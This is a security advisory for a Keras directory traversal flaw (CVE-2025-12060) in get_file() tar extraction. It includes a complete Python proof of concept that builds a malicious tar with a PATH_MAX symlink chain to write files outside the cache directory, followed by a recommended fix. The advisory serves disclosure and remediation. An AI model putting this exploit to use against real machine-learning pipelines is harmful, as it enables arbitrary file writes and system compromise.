# Keras Directory Traversal Vulnerability

**GHSA**: GHSA-hjqc-jx6g-rwp9 | **CVE**: CVE-2025-12060 | **Severity**: high (CVSS 9.8)

**CWE**: CWE-22

**Affected Packages**:
- **keras** (pip): <= 3.11.3

## Description

## Summary

Keras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter="data"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.

## Details

### Root Cause Analysis

**Current Keras Implementation**
```python
# From keras/src/utils/file_utils.py#L121
if zipfile.is_zipfile(file_path):
    # Zip archive.
    archive.extractall(path)
else:
    # Tar archive, perhaps unsafe. Filter paths.
    archive.extractall(path, members=filter_safe_paths(archive))
```

### The Critical Flaw

While Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.

**Exploitation Flow:**
1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe
2. **Extraction begins**: `extractall()` processes the filtered members
3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits
4. **Security bypass**: Failed resolution causes literal path interpretation
5. **Directory traversal**: Files written outside intended directory

### Technical Details

The vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:

- `filter_safe_paths()` operates on the parsed tar member information
- The PATH_MAX bug occurs during actual file system operations in `extractall()`
- Failed symlink resolution falls back to literal path interpretation
- This allows traversal paths like `../../../../etc/passwd` to be written

### Affected Code Location

**File**: `keras/src/utils/file_utils.py`  
**Function**: `extract_archive()` around line 121  
**Issue**: Missing `filter="data"` parameter in `tarfile.extractall()`

## Proof of Concept
```
#!/usr/bin/env python3
import os, io, sys, tarfile, pathlib, platform, threading, time
import http.server, socketserver

# Import Keras directly (not through TensorFlow)
try:
    import keras
    print("Using standalone Keras:", keras.__version__)
    get_file = keras.utils.get_file
except ImportError:
    try:
        import tensorflow as tf
        print("Using Keras via TensorFlow:", tf.keras.__version__)
        get_file = tf.keras.utils.get_file
    except ImportError:
        print("Neither Keras nor TensorFlow found!")
        sys.exit(1)

print("=" * 60)
print("Keras get_file() PATH_MAX Symlink Vulnerability PoC")
print("=" * 60)
print("Python:", sys.version.split()[0])
print("Platform:", platform.platform())

root = pathlib.Path.cwd()
print(f"Working directory: {root}")

# Create target directory for exploit demonstration
exploit_dir = root / "exploit"
exploit_dir.mkdir(exist_ok=True)

# Clean up any previous exploit files
try:
    (exploit_dir / "keras_pwned.txt").unlink()
except FileNotFoundError:
    pass

print(f"\n=== INITIAL STATE ===")
print(f"Exploit directory: {exploit_dir}")
print(f"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}")

# Create malicious tar with PATH_MAX symlink resolution bug
print(f"\n=== Building PATH_MAX Symlink Exploit ===")

# Parameters for PATH_MAX exploitation
comp = 'd' * (55 if sys.platform == 'darwin' else 247)
steps = "abcdefghijklmnop"  # 16-step symlink chain
path = ""

with tarfile.open("keras_dataset.tgz", mode="w:gz") as tar:
    print("Creating deep symlink chain...")
    
    # Build the symlink chain that will exceed PATH_MAX during resolution
    for i, step in enumerate(steps):
        # Directory with long name
        dir_info = tarfile.TarInfo(os.path.join(path, comp))
        dir_info.type = tarfile.DIRTYPE
        tar.addfile(dir_info)
        
        # Symlink pointing to that directory
        link_info = tarfile.TarInfo(os.path.join(path, step))
        link_info.type = tarfile.SYMTYPE
        link_info.linkname = comp
        tar.addfile(link_info)
        
        path = os.path.join(path, comp)
        
        if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th
            print(f"  Step {i+1}: {step} -> {comp[:20]}...")
    
    # Create the final symlink that exceeds PATH_MAX
    # This is where the symlink resolution breaks down
    long_name = "x" * 254
    linkpath = os.path.join("/".join(steps), long_name)
    
    max_link = tarfile.TarInfo(linkpath)
    max_link.type = tarfile.SYMTYPE
    max_link.linkname = ("../" * len(steps))
    tar.addfile(max_link)
    
    print(f"✓ Created PATH_MAX symlink: {len(linkpath)} characters")
    print(f"  Points to: {'../' * len(steps)}")
    
    # Exploit file through the broken symlink resolution
    exploit_path = linkpath + "/../../../exploit/keras_pwned.txt"
    exploit_content = b"KERAS VULNERABILITY CONFIRMED!\nThis file was created outside the cache directory!\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\n"
    
    exploit_file = tarfile.TarInfo(exploit_path)
    exploit_file.type = tarfile.REGTYPE
    exploit_file.size = len(exploit_content)
    tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))
    
    print(f"✓ Added exploit file via broken symlink path")
    
    # Add legitimate dataset content
    dataset_content = b"# Keras Dataset Sample\nThis appears to be a legitimate ML dataset\nimage1.jpg,cat\nimage2.jpg,dog\nimage3.jpg,bird\n"
    dataset_file = tarfile.TarInfo("dataset/labels.csv")
    dataset_file.type = tarfile.REGTYPE
    dataset_file.size = len(dataset_content)
    tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))
    
    # Dataset directory
    dataset_dir = tarfile.TarInfo("dataset/")
    dataset_dir.type = tarfile.DIRTYPE
    tar.addfile(dataset_dir)

print("✓ Malicious Keras dataset created")

# Comparison Test: Python tarfile with filter (SAFE)
print(f"\n=== COMPARISON: Python tarfile with data filter ===")
try:
    with tarfile.open("keras_dataset.tgz", "r:gz") as tar:
        tar.extractall("python_safe", filter="data")
    
    files_after = [f.name for f in exploit_dir.iterdir()]
    print(f"✓ Python safe extraction completed")
    print(f"Files in exploit/: {files_after}")
    
    # Cleanup
    import shutil
    if pathlib.Path("python_safe").exists():
        shutil.rmtree("python_safe", ignore_errors=True)
        
except Exception as e:
    print(f"❌ Python safe extraction blocked: {str(e)[:80]}...")
    files_after = [f.name for f in exploit_dir.iterdir()]
    print(f"Files in exploit/: {files_after}")

# Start HTTP server to serve malicious archive
class SilentServer(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args): pass

def run_server():
    with socketserver.TCPServer(("127.0.0.1", 8005), SilentServer) as httpd:
        httpd.allow_reuse_address = True
        httpd.serve_forever()

server = threading.Thread(target=run_server, daemon=True)
server.start()
time.sleep(0.3)

# Keras vulnerability test
cache_dir = root / "keras_cache"
cache_dir.mkdir(exist_ok=True)
url = "http://127.0.0.1:8005/keras_dataset.tgz"

print(f"\n=== KERAS VULNERABILITY TEST ===")
print(f"Testing: keras.utils.get_file() with extract=True")
print(f"URL: {url}")
print(f"Cache: {cache_dir}")
print(f"Expected extraction: keras_cache/datasets/keras_dataset/")
print(f"Exploit target: exploit/keras_pwned.txt")

try:
    # The vulnerable Keras call
    extracted_path = get_file(
        "keras_dataset",
        url,
        cache_dir=str(cache_dir),
        extract=True
    )
    print(f"✓ Keras extraction completed")
    print(f"✓ Returned path: {extracted_path}")
    
except Exception as e:
    print(f"❌ Keras extraction failed: {e}")
    import traceback
    traceback.print_exc()

# Vulnerability assessment
print(f"\n=== VULNERABILITY RESULTS ===")
final_exploit_files = [f.name for f in exploit_dir.iterdir()]
print(f"Files in exploit directory: {final_exploit_files}")

if "keras_pwned.txt" in final_exploit_files:
    print(f"\n🚨 KERAS VULNERABILITY CONFIRMED! 🚨")
    
    exploit_file = exploit_dir / "keras_pwned.txt"
    content = exploit_file.read_text()
    print(f"Exploit file created: {exploit_file}")
    print(f"Content:\n{content}")
    
    print(f"🔍 TECHNICAL DETAILS:")
    print(f"   • Keras uses tarfile.extractall() without filter parameter")
    print(f"   • PATH_MAX symlink resolution bug bypassed security checks")
    print(f"   • File created outside intended cache directory")
    print(f"   • Same vulnerability pattern as TensorFlow get_file()")
    
    print(f"\n📊 COMPARISON RESULTS:")
    print(f"   ✅ Python with filter='data': BLOCKED exploit")
    print(f"   ⚠️  Keras get_file(): ALLOWED exploit")
    
else:
    print(f"✅ No exploit files detected")
    print(f"Possible reasons:")
    print(f"   • Keras version includes security patches")
    print(f"   • Platform-specific path handling prevented exploit")
    print(f"   • Archive extraction path differed from expected")

# Show what Keras actually extracted (safely)
print(f"\n=== KERAS EXTRACTION ANALYSIS ===")
try:
    if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():
        keras_path = pathlib.Path(extracted_path)
        print(f"Keras extracted to: {keras_path}")
        
        # Safely list contents
        try:
            contents = [item.name for item in keras_path.iterdir()]
            print(f"Top-level contents: {contents}")
            
            # Count symlinks (indicates our exploit structure was created)
            symlink_count = 0
            for item in keras_path.iterdir():
                try:
                    if item.is_symlink():
                        symlink_count += 1
                except PermissionError:
                    continue
            
            print(f"Symlinks created: {symlink_count}")
            if symlink_count > 0:
                print(f"✓ PATH_MAX symlink chain was extracted")
                
        except PermissionError:
            print(f"Permission errors in extraction directory (expected with symlink corruption)")
            
except Exception as e:
    print(f"Could not analyze Keras extraction: {e}")

print(f"\n=== REMEDIATION ===")
print(f"To fix this vulnerability, Keras should use:")
print(f"```python")
print(f"tarfile.extractall(path, filter='data')  # Safe")
print(f"```")
print(f"Instead of:")
print(f"```python") 
print(f"tarfile.extractall(path)  # Vulnerable")
print(f"```")

# Cleanup
print(f"\n=== CLEANUP ===")
try:
    os.unlink("keras_dataset.tgz")
    print(f"✓ Removed malicious tar file")
except:
    pass

print("PoC completed!")

```
### Environment Setup
- **Python**: 3.8+ (tested on multiple versions)
- **Keras**: Standalone Keras or TensorFlow.Keras
- **Platform**: Linux, macOS, Windows (path handling varies)

### Exploitation Steps

1. **Create malicious tar archive** with PATH_MAX symlink chain
2. **Host archive** on accessible HTTP server
3. **Call `keras.utils.get_file()`** with `extract=True`
4. **Observe directory traversal** - files written outside cache directory

### Key Exploit Components

- **Deep symlink chain**: 16+ nested symlinks with long directory names
- **PATH_MAX overflow**: Final symlink path exceeding system limits
- **Traversal payload**: Relative path traversal (`../../../target/file`)
- **Legitimate disguise**: Archive contains valid-looking dataset files

### Demonstration Results

**Vulnerable behavior:**
- Files extracted outside intended `cache_dir/datasets/` location
- Security filtering bypassed completely
- No error or warning messages generated

**Expected secure behavior:**
- Extraction blocked or confined to cache directory
- Security warnings for suspicious archive contents

## Impact

### Vulnerability Classification
- **Type**: Directory Traversal / Path Traversal (CWE-22)
- **Severity**: High
- **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity

### Who Is Impacted

**Direct Impact:**
- Applications using `keras.utils.get_file()` with `extract=True`
- Machine learning pipelines downloading and extracting datasets
- Automated ML training systems processing external archives

**Attack Scenarios:**
1. **Malicious datasets**: Attacker hosts compromised ML dataset
2. **Supply chain**: Legitimate dataset repositories compromised
3. **Model poisoning**: Extraction writes malicious files alongside training data
4. **System compromise**: Configuration files, executables written to system directories

**Affected Environments:**
- Research environments downloading public datasets
- Production ML systems with automated dataset fetching
- Educational platforms using Keras for tutorials
- CI/CD pipelines training models with external data

### Risk Assessment

**High Risk Factors:**
- Common usage pattern in ML workflows
- No user awareness of extraction security
- Silent failure mode (no warnings)
- Cross-platform vulnerability

**Potential Consequences:**
- Arbitrary file write on target system
- Configuration file tampering
- Code injection via overwritten scripts
- Data exfiltration through planted files
- System compromise in containerized environments

## Recommended Fix

### Immediate Mitigation

Replace the vulnerable extraction code with:

```python
# Secure implementation
if zipfile.is_zipfile(file_path):
    # Zip archive - implement similar filtering
    archive.extractall(path, members=filter_safe_paths(archive))
else:
    # Tar archive with proper security filter
    archive.extractall(path, members=filter_safe_paths(archive), filter="data")
```

### Long-term Solution

1. **Add `filter="data"` parameter** to all `tarfile.extractall()` calls
2. **Implement comprehensive path validation** before extraction
3. **Add extraction logging** for security monitoring
4. **Consider sandboxed extraction** for untrusted archives
5. **Update documentation** to warn about archive security risks

### Backward Compatibility

The fix maintains full backward compatibility as `filter="data"` is the recommended secure default for Python 3.12+.

## References

- [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters)
- [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability
- [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)

Note: Reported in Huntr as well, but didn't get response
https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4
